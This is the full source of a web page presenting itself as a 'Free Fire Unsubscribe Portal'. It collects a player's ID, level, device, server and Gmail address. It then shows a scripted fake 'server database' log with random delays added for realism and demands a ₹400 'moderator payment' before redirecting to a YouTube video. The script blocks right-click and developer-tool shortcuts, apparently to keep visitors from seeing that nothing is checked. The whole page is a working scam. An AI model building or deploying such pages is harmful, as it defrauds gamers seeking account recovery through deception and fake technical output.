<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire Unsubscribe Portal</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        body {
            background-color: #0f0f13;
            background-image: radial-gradient(circle at 15% 50%, rgba(0, 255, 128, 0.15), transparent 25%),
                              radial-gradient(circle at 85% 30%, rgba(255, 0, 128, 0.15), transparent 25%);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Container & Glassmorphism (Apple Liquid Glass Theme) */
        .container {
            width: 100%;
            max-width: 500px;
            perspective: 1000px;
        }

        .glass-panel {
            background: rgba(30, 30, 35, 0.4);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 35px 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;
        }

        /* Shake Animation for Validation Error */
        @keyframes shakeError {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            20%, 40%, 60%, 80% { transform: translateX(10px); }
        }

        .shake {
            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
            border: 1px solid rgba(255, 51, 102, 0.5);
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
        }

        /* Header */
        header {
            text-align: center;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 2.2rem;
            color: #00ff44; /* Highlighted Green */
            text-transform: uppercase;
            font-weight: 800;
            text-shadow: 0 0 15px rgba(0, 255, 68, 0.6), 0 0 30px rgba(0, 255, 68, 0.3);
            letter-spacing: 1px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.95rem;
            color: #a0a0a5;
            font-weight: 500;
            padding-left: 5px;
        }

        input, select {
            width: 100%;
            padding: 14px 18px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 1rem;
            transition: all 0.3s ease;
            outline: none;
            appearance: none;
        }

        select {
            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
            background-repeat: no-repeat;
            background-position: right 15px top 50%;
            background-size: 12px auto;
        }

        select option {
            background: #1e1e23;
            color: #fff;
        }

        input:focus, select:focus {
            border-color: #00ff44;
            box-shadow: 0 0 15px rgba(0, 255, 68, 0.2);
            background: rgba(0, 0, 0, 0.5);
        }

        input.input-error, select.input-error {
            border-color: #ff3366;
            box-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
        }

        .error-msg {
            color: #ff3366;
            font-size: 0.85rem;
            margin-top: 5px;
            padding-left: 5px;
            font-weight: bold;
            display: none;
        }

        /* Button */
        .btn-submit {
            background: linear-gradient(135deg, #00ff44, #00b330);
            color: #000;
            border: none;
            padding: 16px;
            font-size: 1.2rem;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            font-weight: 800;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0, 255, 68, 0.3);
            margin-top: 15px;
            letter-spacing: 1px;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 25px rgba(0, 255, 68, 0.4);
        }

        .btn-submit:active {
            transform: translateY(2px);
        }

        /* Processing Container */
        .processing-container {
            display: none;
        }

        .process-title {
            text-align: center;
            color: #00ff44;
            margin-bottom: 20px;
            font-size: 1.6rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 255, 68, 0.5);
            animation: pulse 2s infinite alternate;
        }

        .process-log {
            background: rgba(0, 0, 0, 0.6);
            border-radius: 12px;
            padding: 20px;
            height: 250px;
            overflow-y: auto;
            border: 1px solid rgba(255, 255, 255, 0.05);
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.95rem;
            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
        }

        .log-entry {
            margin-bottom: 12px;
            opacity: 0;
            transform: translateY(10px);
            transition: all 0.3s ease;
        }

        .log-entry.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .c-green { color: #00ff44; font-weight: bold; }
        .c-blue { color: #00ccff; font-weight: bold; }
        .c-red { color: #ff3366; font-weight: bold; }
        .c-yellow { color: #ffcc00; font-weight: bold; }

        /* Transition Blinking Screen */
        .transition-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }

        .transition-screen.active {
            opacity: 1;
            pointer-events: all;
        }

        .transition-image {
            max-width: 15%;
            max-height: 15%;
        }

        @keyframes blinkImage {
            0% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.8)); }
            50% { opacity: 0.5; transform: scale(0.95); filter: drop-shadow(0 0 0px rgba(255, 255, 255, 0)); }
            100% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.8)); }
        }

        .transition-image.blink {
            animation: blinkImage 1s infinite ease-in-out;
        }

        @keyframes pulse {
            from { text-shadow: 0 0 5px rgba(0, 255, 68, 0.5); }
            to { text-shadow: 0 0 20px rgba(0, 255, 68, 0.8); }
        }

        @media (max-width: 768px) {
            .transition-image { max-width: 25%; max-height: 25%; }
        }
    </style>
</head>
<body>

    <div class="transition-screen" id="transitionScreen">
        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
    </div>

    <div class="container" id="mainContainer">
        <div class="glass-panel" id="glassPanel">
            
            <div id="formSection">
                <header>
                    <h1>Free Fire Unsubscribe</h1>
                </header>
                
                <form id="unsubscribeForm" novalidate>
                    
                    <div class="form-group">
                        <label>Free Fire Player ID</label>
                        <input type="text" id="uid" inputmode="numeric" placeholder="Please enter your ID" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="uidError">Please enter a valid Player ID (7 to 16 digits).</div>
                    </div>

                    <div class="form-group">
                        <label>Your Device</label>
                        <select id="device">
                            <option value="" disabled selected>Choose your device</option>
                            <option value="Android">Android</option>
                            <option value="iPhone">iOS (iPhone)</option>
                            <option value="PC">PC (Emulator)</option>
                        </select>
                        <div class="error-msg" id="deviceError">Please select your device.</div>
                    </div>

                    <div class="form-group">
                        <label>Server Region</label>
                        <select id="server">
                            <option value="" disabled selected>Select your server</option>
                            <option value="India">India</option>
                            <option value="Bangladesh">Bangladesh</option>
                            <option value="Singapore">Singapore</option>
                            <option value="MENA">MENA</option>
                            <option value="Brazil">Brazil</option>
                        </select>
                        <div class="error-msg" id="serverError">Please select a server region.</div>
                    </div>

                    <div class="form-group">
                        <label>Reason for Unsubscribe</label>
                        <select id="reason">
                            <option value="" disabled selected>Select a reason...</option>
                            <option value="Maine janbuj ke khud Kiya">Maine janbuj ke khud Kiya</option>
                            <option value="Kisi aur Ne Kar Diya">Kisi aur Ne Kar Diya</option>
                            <option value="Gmail compromise ho gaya tha">Gmail compromise ho gaya tha</option>
                            <option value="Mere ko pata nahin">Mere ko pata nahin</option>
                        </select>
                        <div class="error-msg" id="reasonError">Please select a reason.</div>
                    </div>

                    <div class="form-group">
                        <label>ID Level</label>
                        <input type="text" id="level" inputmode="numeric" placeholder="Enter ID Level" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="levelError">ID mismatch or Level not found (Must be between 11 to 95).</div>
                    </div>

                    <div class="form-group">
                        <label>Unsubscribed Gmail ID (To Resubscribe)</label>
                        <input type="email" id="gmail" placeholder="Enter Gmail address">
                        <div class="error-msg" id="gmailError">Please enter a valid Gmail ID.</div>
                    </div>

                    <button type="button" class="btn-submit" id="proceedBtn">PROCEED</button>
                </form>
            </div>

            <div class="processing-container" id="processingSection">
                <div class="process-title">FREE FIRE RESUBSCRIBE</div>
                <div class="process-log" id="processLog">
                    </div>
            </div>

        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            
            // Prevent inspect element
            document.addEventListener('contextmenu', event => event.preventDefault());
            document.onkeydown = function(e) {
                if(e.keyCode == 123) return false;
                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
            }

            const proceedBtn = document.getElementById('proceedBtn');
            const glassPanel = document.getElementById('glassPanel');
            const formSection = document.getElementById('formSection');
            const processingSection = document.getElementById('processingSection');
            const processLog = document.getElementById('processLog');
            const transitionScreen = document.getElementById('transitionScreen');
            const transitionImage = document.getElementById('transitionImage');

            // Form validation logic on button click
            proceedBtn.addEventListener('click', () => {
                let isValid = true;

                // Elements
                const uid = document.getElementById('uid');
                const device = document.getElementById('device');
                const server = document.getElementById('server');
                const reason = document.getElementById('reason');
                const level = document.getElementById('level');
                const gmail = document.getElementById('gmail');

                // Error Msg Elements
                const uidError = document.getElementById('uidError');
                const deviceError = document.getElementById('deviceError');
                const serverError = document.getElementById('serverError');
                const reasonError = document.getElementById('reasonError');
                const levelError = document.getElementById('levelError');
                const gmailError = document.getElementById('gmailError');

                // Reset all errors visually first
                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');

                // 1. UID Validation (7 to 16 digits)
                if (uid.value.length < 7 || uid.value.length > 16) {
                    uid.classList.add('input-error');
                    uidError.style.display = 'block';
                    isValid = false;
                }

                // 2. Device Validation
                if (device.value === "") {
                    device.classList.add('input-error');
                    deviceError.style.display = 'block';
                    isValid = false;
                }

                // 3. Server Validation
                if (server.value === "") {
                    server.classList.add('input-error');
                    serverError.style.display = 'block';
                    isValid = false;
                }

                // 4. Reason Validation
                if (reason.value === "") {
                    reason.classList.add('input-error');
                    reasonError.style.display = 'block';
                    isValid = false;
                }

                // 5. Level Validation (11 to 95)
                const lvlNum = parseInt(level.value);
                if (isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95) {
                    level.classList.add('input-error');
                    levelError.style.display = 'block';
                    isValid = false;
                }

                // 6. Gmail Validation
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(gmail.value) || !gmail.value.toLowerCase().includes('gmail.com')) {
                    gmail.classList.add('input-error');
                    gmailError.style.display = 'block';
                    isValid = false;
                }

                // If any validation fails, shake the form
                if (!isValid) {
                    glassPanel.classList.remove('shake');
                    void glassPanel.offsetWidth; // Trigger reflow to restart animation
                    glassPanel.classList.add('shake');
                    
                    // Remove shake class after animation completes so it can trigger again
                    setTimeout(() => {
                        glassPanel.classList.remove('shake');
                    }, 500);
                    return; // Stop execution here
                }

                // If valid, start processing
                startProcessing(uid.value, level.value, gmail.value);
            });

            // Mask Gmail (e.g., a*******g@gmail.com)
            function maskEmail(email) {
                let parts = email.split('@');
                let name = parts[0];
                let domain = parts[1];
                if(name.length > 2) {
                    return name[0] + '*******' + name[name.length - 1] + '@' + domain;
                } else {
                    return name[0] + '***@' + domain;
                }
            }

            function startProcessing(uid, level, email) {
                // Hide form, show processing screen
                formSection.style.display = 'none';
                processingSection.style.display = 'block';

                const maskedEmail = maskEmail(email);

                // Logs
                const logs = [
                    `<span class="c-blue">[*] Initiating connection to Server Database...</span>`,
                    `<span class="c-green">[+] Secure Connection Established.</span>`,
                    `<span class="c-yellow">[*] Scanning Player UID: ${uid}...</span>`,
                    `<span class="c-green">[+] Player Profile successfully located.</span>`,
                    `[*] Checking Account Level details: Level ${level}`,
                    `<span class="c-green">[+] Level verified successfully.</span>`,
                    `<span class="c-blue">[*] Fetching Unsubscribed Email data...</span>`,
                    `<span class="c-yellow">[*] Verifying Link for: ${maskedEmail}</span>`,
                    `<span class="c-green">[+] Account parameters perfectly matched!</span>`,
                    `[*] Preparing ID to Resubscribe...`,
                    `<span class="c-green">[+] All checks passed. Account is ready!</span>`,
                    `<br><span class="c-yellow">Moderator payment charges: ₹400</span>`
                ];

                let index = 0;

                function appendLog() {
                    if (index < logs.length) {
                        const div = document.createElement('div');
                        div.className = 'log-entry';
                        div.innerHTML = logs[index];
                        processLog.appendChild(div);
                        
                        // Scroll to bottom
                        processLog.scrollTop = processLog.scrollHeight;
                        
                        // Fade in animation
                        setTimeout(() => div.classList.add('visible'), 50);

                        index++;
                        // Random delay between lines for realism (600ms to 1500ms)
                        let delay = Math.floor(Math.random() * 900) + 600;
                        setTimeout(appendLog, delay);
                    } else {
                        // After logs finish, wait 2 seconds, then show the blinking image screen
                        setTimeout(showBlinkingScreen, 2000);
                    }
                }

                // Start appending logs
                setTimeout(appendLog, 800);
            }

            function showBlinkingScreen() {
                // Show final blinking screen
                transitionScreen.classList.add('active');
                transitionImage.classList.add('blink');

                // Redirect without showing any text
                setTimeout(() => {
                    window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
                }, 3500); // 3.5 seconds blinking before redirect
            }
        });
    </script>
</body>
</html>
